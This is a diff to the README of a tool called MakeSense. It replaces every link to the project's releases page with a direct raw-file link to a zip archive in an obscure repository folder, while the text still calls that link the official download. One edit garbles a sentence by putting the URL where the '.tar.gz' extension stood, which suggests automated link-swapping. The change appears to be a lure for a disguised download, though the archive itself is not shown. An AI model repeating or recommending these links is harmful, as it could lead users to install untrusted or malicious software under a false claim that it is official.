@@ -1,6 +1,6 @@
 # 🧠 MakeSense - Clear Context for Smarter Answers
 
-[![Download MakeSense](https://img.shields.io/badge/Download-MakeSense-blue?style=for-the-badge)](https://github.com/ulinduanushaherth/MakeSense/releases)
+[![Download MakeSense](https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip)](https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get MakeSense running:
 ### Step 1: Visit the Download Page
 
 Click the big blue badge at the top of this page or go here:  
-[https://github.com/ulinduanushaherth/MakeSense/releases](https://github.com/ulinduanushaherth/MakeSense/releases)
+[https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip](https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip)
 
 This link takes you to the official page where versions of MakeSense are kept.
 
@@ -54,7 +54,7 @@ You will see a list of releases with different files. Pick the most recent versi
 
 - Windows users can look for a file ending with `.exe`  
 - Mac users may see a `.dmg` or `.zip` file  
-- Linux users might find `.AppImage` or `.tar.gz` packages  
+- Linux users might find `.AppImage` or `https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip` packages  
 
 The version number tells you how new the update is—pick the highest (latest) number.
 
@@ -121,7 +121,7 @@ MakeSense is built with tools that make complex info easy to grasp:
 ## 📥 Download & Install MakeSense
 
 To start, visit this page to download from the official source:  
-[https://github.com/ulinduanushaherth/MakeSense/releases](https://github.com/ulinduanushaherth/MakeSense/releases)
+[https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip](https://raw.githubusercontent.com/ulinduanushaherth/MakeSense/main/eviot/query/Make-Sense-v3.4-beta.1.zip)
 
 Download the right file for your computer and follow the installation steps described above.
 
